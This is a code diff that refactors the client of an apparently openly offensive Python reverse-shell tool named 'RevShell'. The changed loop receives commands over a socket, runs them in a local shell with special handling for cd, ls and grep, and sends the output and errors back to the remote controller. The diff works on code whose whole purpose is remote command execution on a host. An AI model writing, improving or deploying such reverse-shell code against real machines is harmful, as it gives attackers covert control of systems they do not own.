@@ -41,11 +41,8 @@ class Client(StreamSocket):
                 return [command.encode(), utils.Ansi.clear(), b""]
 
             if family == "cd":
-                exists, path = self.change_dir(command)
-
+                exists, path = self._change_dir(command)
                 if exists:
-                    #self.LastWD = str(path)
-                    #return [command.encode(), str(path).encode(), b""]
                     return [command.encode(), path.encode(), b""]
                 else:
                     error_msg = f"Cannot resolve path {path}".encode()
@@ -54,12 +51,11 @@ class Client(StreamSocket):
             if family == "ls":
                 if utils.OPSYS != "nt":
                     command = f"{command} -A --color"
-
             # TODO: fix issue with grep throwing false-positives
             elif family == "grep":
-                if utils.OPSYS != "nt":
-                    #command = f"{command} -i --color"
-                    command = f"{command} --color"
+                #if utils.OPSYS != "nt":
+                #command = f"{command} -i --color"
+                pass
 
         return self._run_cmd(command, self.Shell)
 
@@ -96,35 +92,34 @@ class Client(StreamSocket):
                 command = self.recv_msg(sock)
                 family = self.check_special(command)
 
-                if family != "exit":
-                    cmd_out = self.execute(command)
-                    cmd = cmd_out[0]
-                    stdout = cmd_out[1]
-                    stderr = cmd_out[2]
-
-                    if stderr == b"":
-                        output = stdout
-                        level = "output"
-                    else:
-                        output = stderr
-                        level = "error"
-
-                    if self.Debug:
-                        # TODO: fix and test debug options
-                        utils.status(output.decode(), level, command)
-                    elif self.Verbose:
-                        utils.stdin_status(command, level)
-
-                    # send ==> command output
-                    if output == stdout:
-                        self.send_output(sock, output.decode(), "stdout")
-                    else:
-                        self.send_output(sock, output.decode(), "stderr")
-                else:
+                if family == "exit":
                     if self.Verbose:
                         utils.stdin_status("exit")
                         utils.status("Exiting RevShell.")
                     break
+
+                cmd_out = self.execute(command)
+                stdout = cmd_out[1]
+                stderr = cmd_out[2]
+
+                if stderr == b"":
+                    output = stdout
+                    level = "output"
+                else:
+                    output = stderr
+                    level = "error"
+
+                if self.Debug:
+                    # TODO: fix and test debug options
+                    utils.status(output.decode(), level, command)
+                elif self.Verbose:
+                    utils.stdin_status(command, level)
+
+                # send ==> command output
+                if output == stdout:
+                    self.send_output(sock, output.decode(), "output")
+                else:
+                    self.send_output(sock, output.decode(), "error")
         except Exception as exc:
             self.except_handler(exc)
         finally:
